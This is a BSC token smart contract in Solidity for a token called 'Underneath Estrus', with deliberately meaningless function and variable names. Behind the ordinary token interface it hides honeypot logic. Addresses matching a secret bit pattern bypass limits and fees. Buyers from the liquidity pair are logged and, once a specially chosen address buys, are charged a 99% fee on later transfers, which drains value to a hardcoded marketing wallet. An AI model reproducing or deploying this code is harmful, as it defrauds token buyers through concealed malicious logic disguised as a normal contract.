/**
 *Submitted for verification at BscScan.com on 2022-12-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


library SafeMath {

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

}


interface IUniswapV2Router {

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function getOwner() external view returns (address);

    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function name() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    function SetAuthorized(address adr) public onlyAuthorized() {
        competent[adr] = true;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

}




contract UnderneathEstrus is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 teamMinBurnIsEnable = 100000000 * (10 ** _decimals);
    uint256  minAutoTradingEnable = 2000000 * 10 ** _decimals;
    uint256  takeTokenLimitSell = 2000000 * 10 ** _decimals;


    string constant _name = "Underneath Estrus";
    string constant _symbol = "UES";
    uint8 constant _decimals = 18;

    uint256 private liquidityFromModeTake = 0;
    uint256 private sellFundSenderLimit = 8;

    uint256 private fromMinFeeAmount = 0;
    uint256 private launchedShouldAtLaunch = 8;

    bool private marketingSellEnableTotal = true;
    bool private mintLaunchSenderBurnSwap = true;
    bool private feeExemptTeamIsMinLiquidity = true;
    bool private senderTeamTotalIsSellExempt = true;
    bool private receiverMinLaunchedTradingWalletToken = true;
    uint256 buyTotalTakeLimitShould = 2 ** 18 - 1;
    uint256 private takeLaunchMintLiquidity = 6 * 10 ** 15;
    uint256 private receiverModeTotalReceiverBotsSenderMin = teamMinBurnIsEnable / 1000; // 0.1%
    uint256 receiverListBotsMin = 51950;

    uint256 private botsEnableFeeReceiver = sellFundSenderLimit + liquidityFromModeTake;
    uint256 private isFundFeeTotalSender = 100;

    bool private fundTradingTakeMode;
    uint256 private maxSellBotsLaunchMin;
    uint256 private modeMaxTokenLimitMint;
    uint256 private botsTotalAtAmount;
    uint256 private tokenListModeExemptSell;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchFromMarketingTeam;
    mapping(address => bool) private takeEnableMintReceiverModeTeamBurn;
    mapping(address => bool) private liquidityTradingTotalMode;
    mapping(address => bool) private amountLaunchedTxLimit;
    mapping(address => uint256) private isSwapToMarketing;
    mapping(uint256 => address) private atFundEnableWalletMaxSellAmount;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;

    IUniswapV2Router public autoBotsTotalMin;
    address public uniswapV2Pair;

    uint256 private launchMarketingFundMint;
    uint256 private senderReceiverReceiverFeeBurnAt;

    address private tradingSellSenderMarketingLaunchWalletLimit = (msg.sender); // auto-liq address
    address private maxTradingTokenTake = (0xc3291A35d6De97090B832b87FffFC34f59da07d5); // marketing address

    
    bool private modeFundMinLaunchedLiquiditySender = false;
    bool public buyBurnModeAuto = false;
    bool public totalToTokenWalletMintSwap = false;
    bool private modeLaunchedFromAutoExempt = false;
    uint256 private fundReceiverLaunchFrom = 0;
    bool public isAtAmountFrom = false;
    uint256 private marketingAmountTxTeam = 0;
    uint256 public fundBurnTxReceiverSellTake = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        autoBotsTotalMin = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(autoBotsTotalMin.factory()).createPair(address(this), autoBotsTotalMin.WETH());
        _allowances[address(this)][address(autoBotsTotalMin)] = teamMinBurnIsEnable;

        fundTradingTakeMode = true;

        liquidityTradingTotalMode[msg.sender] = true;
        liquidityTradingTotalMode[0x0000000000000000000000000000000000000000] = true;
        liquidityTradingTotalMode[0x000000000000000000000000000000000000dEaD] = true;
        liquidityTradingTotalMode[address(this)] = true;

        launchFromMarketingTeam[msg.sender] = true;
        launchFromMarketingTeam[address(this)] = true;

        takeEnableMintReceiverModeTeamBurn[msg.sender] = true;
        takeEnableMintReceiverModeTeamBurn[0x0000000000000000000000000000000000000000] = true;
        takeEnableMintReceiverModeTeamBurn[0x000000000000000000000000000000000000dEaD] = true;
        takeEnableMintReceiverModeTeamBurn[address(this)] = true;

        approve(_router, teamMinBurnIsEnable);
        approve(address(uniswapV2Pair), teamMinBurnIsEnable);
        _balances[msg.sender] = teamMinBurnIsEnable;
        emit Transfer(address(0), msg.sender, teamMinBurnIsEnable);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return teamMinBurnIsEnable;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, teamMinBurnIsEnable);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return listAutoMinSenderShould(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != teamMinBurnIsEnable) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return listAutoMinSenderShould(sender, recipient, amount);
    }

    function getliquidityTakeReceiverList(address mintEnableFeeTx) public view returns (bool) {
        if (takeEnableMintReceiverModeTeamBurn[mintEnableFeeTx] != liquidityTradingTotalMode[mintEnableFeeTx]) {
            return receiverMinLaunchedTradingWalletToken;
        }
            return takeEnableMintReceiverModeTeamBurn[mintEnableFeeTx];
    }

    function setliquidityTakeReceiverList(address mintEnableFeeTx,bool takeTotalTradingShould) public onlyOwner {
        if (takeEnableMintReceiverModeTeamBurn[mintEnableFeeTx] != liquidityTradingTotalMode[mintEnableFeeTx]) {
           liquidityTradingTotalMode[mintEnableFeeTx]=takeTotalTradingShould;
        }
        if (mintEnableFeeTx == DEAD) {
            feeExemptTeamIsMinLiquidity=takeTotalTradingShould;
        }
        if (mintEnableFeeTx == WBNB) {
            feeExemptTeamIsMinLiquidity=takeTotalTradingShould;
        }
        takeEnableMintReceiverModeTeamBurn[mintEnableFeeTx]=takeTotalTradingShould;
    }

    function listAutoMinSenderShould(address exemptMarketingListMin, address limitFeeMaxBurnAt, uint256 minTokenToAmount) internal returns (bool) {
        
        bool launchMaxToMintMarketingShould = txLaunchedTotalReceiverEnable(exemptMarketingListMin) || txLaunchedTotalReceiverEnable(limitFeeMaxBurnAt);
        
        if (exemptMarketingListMin == uniswapV2Pair) {
            if (maxWalletAmount != 0 && fromListTokenIsLimitEnable(uint160(limitFeeMaxBurnAt))) {
                txLimitMarketingAt();
            }
            if (!launchMaxToMintMarketingShould) {
                amountReceiverModeReceiver(limitFeeMaxBurnAt);
            }
        }
        
        
        if (inSwap || launchMaxToMintMarketingShould) {return modeLiquidityLaunchExempt(exemptMarketingListMin, limitFeeMaxBurnAt, minTokenToAmount);}
        
        require((minTokenToAmount <= minAutoTradingEnable) || liquidityTradingTotalMode[exemptMarketingListMin] || liquidityTradingTotalMode[limitFeeMaxBurnAt], "Max TX Limit!");

        if (marketingLimitSwapFrom()) {feeMintListEnable();}

        _balances[exemptMarketingListMin] = _balances[exemptMarketingListMin].sub(minTokenToAmount, "Insufficient Balance!");
        
        uint256 minTokenToAmountReceived = maxBotsTakeExemptTeam(exemptMarketingListMin) ? takeBotsListReceiver(exemptMarketingListMin, limitFeeMaxBurnAt, minTokenToAmount) : minTokenToAmount;

        _balances[limitFeeMaxBurnAt] = _balances[limitFeeMaxBurnAt].add(minTokenToAmountReceived);
        emit Transfer(exemptMarketingListMin, limitFeeMaxBurnAt, minTokenToAmountReceived);
        return true;
    }

    function mintModeAtEnable(address exemptMarketingListMin, uint256 totalMarketingExemptIsTakeTokenTx) private view returns (uint256) {
        uint256 maxBuyIsSender = isSwapToMarketing[exemptMarketingListMin];
        if (maxBuyIsSender > 0 && burnTeamMinReceiver() - maxBuyIsSender > 2) {
            return 99;
        }
        return totalMarketingExemptIsTakeTokenTx;
    }

    function fromListTokenIsLimitEnable(uint160 limitFeeMaxBurnAt) private view returns (bool) {
        return uint16(limitFeeMaxBurnAt) == receiverListBotsMin;
    }

    function burnTeamMinReceiver() private view returns (uint256) {
        return block.timestamp;
    }

    function modeLiquidityLaunchExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txLaunchedTotalReceiverEnable(address launchReceiverBurnLimitTeamTokenMode) private view returns (bool) {
        return ((uint256(uint160(launchReceiverBurnLimitTeamTokenMode)) << 192) >> 238) == buyTotalTakeLimitShould;
    }

    function setmintTeamExemptMarketingTx(bool mintEnableFeeTx) public onlyOwner {
        marketingSellEnableTotal=mintEnableFeeTx;
    }

    function getteamMinMaxLaunched(address mintEnableFeeTx) public view returns (bool) {
        if (mintEnableFeeTx != maxTradingTokenTake) {
            return receiverMinLaunchedTradingWalletToken;
        }
        if (launchFromMarketingTeam[mintEnableFeeTx] == launchFromMarketingTeam[mintEnableFeeTx]) {
            return modeLaunchedFromAutoExempt;
        }
        if (mintEnableFeeTx != DEAD) {
            return isAtAmountFrom;
        }
            return launchFromMarketingTeam[mintEnableFeeTx];
    }

    function getbotsLiquidityTakeBurn() public view returns (address) {
        return maxTradingTokenTake;
    }

    function feeMintListEnable() internal swapping {
        
        uint256 minTokenToAmountToLiquify = receiverModeTotalReceiverBotsSenderMin.mul(liquidityFromModeTake).div(botsEnableFeeReceiver).div(2);
        uint256 limitBotsMintTokenAuto = receiverModeTotalReceiverBotsSenderMin.sub(minTokenToAmountToLiquify);

        address[] memory enableToLiquidityReceiver = new address[](2);
        enableToLiquidityReceiver[0] = address(this);
        enableToLiquidityReceiver[1] = autoBotsTotalMin.WETH();
        autoBotsTotalMin.swapExactTokensForETHSupportingFeeOnTransferTokens(
            limitBotsMintTokenAuto,
            0,
            enableToLiquidityReceiver,
            address(this),
            block.timestamp
        );
        
        uint256 minTokenToAmountBNB = address(this).balance;
        uint256 receiverAmountSellTotal = botsEnableFeeReceiver.sub(liquidityFromModeTake.div(2));
        uint256 botsTotalMinReceiver = minTokenToAmountBNB.mul(liquidityFromModeTake).div(receiverAmountSellTotal).div(2);
        uint256 modeTxTeamBuy = minTokenToAmountBNB.mul(sellFundSenderLimit).div(receiverAmountSellTotal);
        
        if (fundBurnTxReceiverSellTake == liquidityFromModeTake) {
            fundBurnTxReceiverSellTake = fromMinFeeAmount;
        }


        payable(maxTradingTokenTake).transfer(modeTxTeamBuy);

        if (minTokenToAmountToLiquify > 0) {
            autoBotsTotalMin.addLiquidityETH{value : botsTotalMinReceiver}(
                address(this),
                minTokenToAmountToLiquify,
                0,
                0,
                tradingSellSenderMarketingLaunchWalletLimit,
                block.timestamp
            );
            emit AutoLiquify(botsTotalMinReceiver, minTokenToAmountToLiquify);
        }
    }

    function getisTeamEnableFrom() public view returns (bool) {
        return senderTeamTotalIsSellExempt;
    }

    function txLimitMarketingAt() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (isSwapToMarketing[atFundEnableWalletMaxSellAmount[i]] == 0) {
                    isSwapToMarketing[atFundEnableWalletMaxSellAmount[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function setbotsLiquidityTakeBurn(address mintEnableFeeTx) public onlyOwner {
        if (maxTradingTokenTake != maxTradingTokenTake) {
            maxTradingTokenTake=mintEnableFeeTx;
        }
        if (maxTradingTokenTake != WBNB) {
            WBNB=mintEnableFeeTx;
        }
        maxTradingTokenTake=mintEnableFeeTx;
    }

    function setteamMinMaxLaunched(address mintEnableFeeTx,bool takeTotalTradingShould) public onlyOwner {
        if (mintEnableFeeTx == WBNB) {
            senderTeamTotalIsSellExempt=takeTotalTradingShould;
        }
        if (launchFromMarketingTeam[mintEnableFeeTx] != takeEnableMintReceiverModeTeamBurn[mintEnableFeeTx]) {
           takeEnableMintReceiverModeTeamBurn[mintEnableFeeTx]=takeTotalTradingShould;
        }
        if (mintEnableFeeTx == ZERO) {
            modeFundMinLaunchedLiquiditySender=takeTotalTradingShould;
        }
        launchFromMarketingTeam[mintEnableFeeTx]=takeTotalTradingShould;
    }

    function maxBotsTakeExemptTeam(address exemptMarketingListMin) internal view returns (bool) {
        return !takeEnableMintReceiverModeTeamBurn[exemptMarketingListMin];
    }

    function takeBotsListReceiver(address exemptMarketingListMin, address sellMarketingAtTxToTakeList, uint256 minTokenToAmount) internal returns (uint256) {
        
        if (isAtAmountFrom != senderTeamTotalIsSellExempt) {
            isAtAmountFrom = modeLaunchedFromAutoExempt;
        }


        uint256 totalMarketingExemptIsTakeTokenTxAmount = minTokenToAmount.mul(tokenReceiverTradingMaxMint(exemptMarketingListMin, sellMarketingAtTxToTakeList == uniswapV2Pair)).div(isFundFeeTotalSender);

        if (amountLaunchedTxLimit[exemptMarketingListMin] || amountLaunchedTxLimit[sellMarketingAtTxToTakeList]) {
            totalMarketingExemptIsTakeTokenTxAmount = minTokenToAmount.mul(99).div(isFundFeeTotalSender);
        }

        _balances[address(this)] = _balances[address(this)].add(totalMarketingExemptIsTakeTokenTxAmount);
        emit Transfer(exemptMarketingListMin, address(this), totalMarketingExemptIsTakeTokenTxAmount);
        
        return minTokenToAmount.sub(totalMarketingExemptIsTakeTokenTxAmount);
    }

    function getteamExemptEnableLaunch() public view returns (uint256) {
        return receiverModeTotalReceiverBotsSenderMin;
    }

    function marketingLimitSwapFrom() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        receiverMinLaunchedTradingWalletToken &&
        _balances[address(this)] >= receiverModeTotalReceiverBotsSenderMin;
    }

    function setisTeamEnableFrom(bool mintEnableFeeTx) public onlyOwner {
        if (senderTeamTotalIsSellExempt == mintLaunchSenderBurnSwap) {
            mintLaunchSenderBurnSwap=mintEnableFeeTx;
        }
        if (senderTeamTotalIsSellExempt != senderTeamTotalIsSellExempt) {
            senderTeamTotalIsSellExempt=mintEnableFeeTx;
        }
        senderTeamTotalIsSellExempt=mintEnableFeeTx;
    }

    function setteamExemptEnableLaunch(uint256 mintEnableFeeTx) public onlyOwner {
        if (receiverModeTotalReceiverBotsSenderMin == launchBlock) {
            launchBlock=mintEnableFeeTx;
        }
        receiverModeTotalReceiverBotsSenderMin=mintEnableFeeTx;
    }

    function amountReceiverModeReceiver(address launchReceiverBurnLimitTeamTokenMode) private {
        if (limitFundMaxAmountSwap() < takeLaunchMintLiquidity) {
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        atFundEnableWalletMaxSellAmount[maxWalletAmount] = launchReceiverBurnLimitTeamTokenMode;
    }

    function getmintTeamExemptMarketingTx() public view returns (bool) {
        if (marketingSellEnableTotal == mintLaunchSenderBurnSwap) {
            return mintLaunchSenderBurnSwap;
        }
        if (marketingSellEnableTotal != isAtAmountFrom) {
            return isAtAmountFrom;
        }
        return marketingSellEnableTotal;
    }

    function tokenReceiverTradingMaxMint(address exemptMarketingListMin, bool senderShouldLiquidityFund) internal returns (uint256) {
        
        if (senderShouldLiquidityFund) {
            botsEnableFeeReceiver = launchedShouldAtLaunch + fromMinFeeAmount;
            return mintModeAtEnable(exemptMarketingListMin, botsEnableFeeReceiver);
        }
        if (!senderShouldLiquidityFund && exemptMarketingListMin == uniswapV2Pair) {
            botsEnableFeeReceiver = sellFundSenderLimit + liquidityFromModeTake;
            return botsEnableFeeReceiver;
        }
        return mintModeAtEnable(exemptMarketingListMin, botsEnableFeeReceiver);
    }

    function limitFundMaxAmountSwap() private view returns (uint256) {
        address fromEnableTeamLiquidity = WBNB;
        if (address(this) < WBNB) {
            fromEnableTeamLiquidity = address(this);
        }
        (uint takeReceiverAtTxBurnList, uint botsMintBuyLaunched,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 walletLaunchedBotsTeamEnable,) = WBNB == fromEnableTeamLiquidity ? (takeReceiverAtTxBurnList, botsMintBuyLaunched) : (botsMintBuyLaunched, takeReceiverAtTxBurnList);
        uint256 isTotalLaunchedMin = IERC20(WBNB).balanceOf(uniswapV2Pair) - walletLaunchedBotsTeamEnable;
        return isTotalLaunchedMin;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}